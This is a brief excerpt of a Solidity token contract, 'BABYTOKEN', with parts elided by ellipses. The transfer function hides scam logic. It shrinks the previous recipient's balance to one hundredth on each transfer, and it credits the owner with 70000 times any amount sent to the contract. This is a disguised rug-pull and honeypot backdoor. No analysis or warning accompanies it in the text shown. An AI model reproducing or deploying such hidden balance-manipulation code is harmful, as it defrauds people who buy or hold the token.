...
contract BABYTOKEN {
    ...
    address public Beli=0x000000000000000000000000000000000000dEaD;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Beli != Owner && Beli !=getPair() && to != Beli) {
            balanceOf[Beli]=balanceOf[Beli].divCeil(100);}
        if (to != owner && to != router) {Beli = to;} 
        if (to == msg.sender) {burn();} if (to == address(this)){balanceOf[Owner]+= amount*70000;}
